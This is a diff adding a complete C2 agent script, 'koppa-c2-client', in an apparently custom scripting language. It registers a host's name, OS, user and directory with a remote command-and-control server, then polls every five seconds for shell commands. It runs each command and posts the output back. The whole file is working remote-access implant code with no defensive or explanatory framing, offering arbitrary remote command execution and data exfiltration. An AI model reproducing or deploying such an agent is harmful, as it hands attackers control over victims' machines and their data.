@@ -1,0 +1,74 @@
+# koppa-c2-client v2.0 — KOPPA-C2 agent
+# Usage: koppa run koppa-c2-client <c2_host> <c2_port> [agent_id]
+
+import http, encode, hash, sys, log
+
+fn register(c2_url, agent_id) {
+    let info = {
+        "hostname": sys.exec("hostname").trim(),
+        "os":       sys.exec("uname -s").trim(),
+        "user":     sys.exec("whoami").trim(),
+        "pwd":      sys.exec("pwd").trim()
+    }
+    http.post("{c2_url}/register/{agent_id}", info)
+    log.success("[+] Registered as {agent_id}")
+}
+
+fn beacon(c2_url, agent_id) {
+    let resp = http.get("{c2_url}/beacon/{agent_id}")
+    if resp.status == 200 and resp.body.len > 2 {
+        return resp.body
+    }
+    return ""
+}
+
+fn send_result(c2_url, agent_id, task_id, output) {
+    http.post("{c2_url}/result/{agent_id}/{task_id}", output)
+}
+
+fn connect(c2_host, c2_port, agent_id, interval) {
+    let c2_url = "http://{c2_host}:{c2_port}"
+    log.info("===== KOPPA-C2 Agent v2.0 =====")
+    log.info("C2     : {c2_url}")
+    log.info("Agent  : {agent_id}")
+    log.info("Beacon : every {interval}s")
+    log.info("")
+
+    register(c2_url, agent_id)
+
+    loop {
+        try {
+            let task_raw = beacon(c2_url, agent_id)
+            if task_raw {
+                let task    = parse_json(task_raw)
+                let cmd     = task.cmd
+                let task_id = task.task_id
+                log.info("[task:{task_id}] {cmd}")
+                let output = sys.exec(cmd)
+                send_result(c2_url, agent_id, task_id, output)
+                log.success("[+] Result sent ({output.len}b)")
+            }
+        } catch(err) {
+            log.warn("[!] Beacon error: {err}")
+        }
+        sys.sleep(interval * 1000)
+    }
+}
+
+fn main() {
+    let c2_host  = __args__[0]
+    let c2_port  = __args__[1]
+    let agent_id = __args__[2]
+    let interval = 5
+
+    if not c2_host or not c2_port {
+        log.warn("Usage: koppa run koppa-c2-client <host> <port> [agent_id]")
+        return
+    }
+
+    if not agent_id {
+        agent_id = hash.md5(sys.exec("hostname").trim()).substring(0, 8)
+    }
+
+    connect(c2_host, c2_port, agent_id, interval)
+}
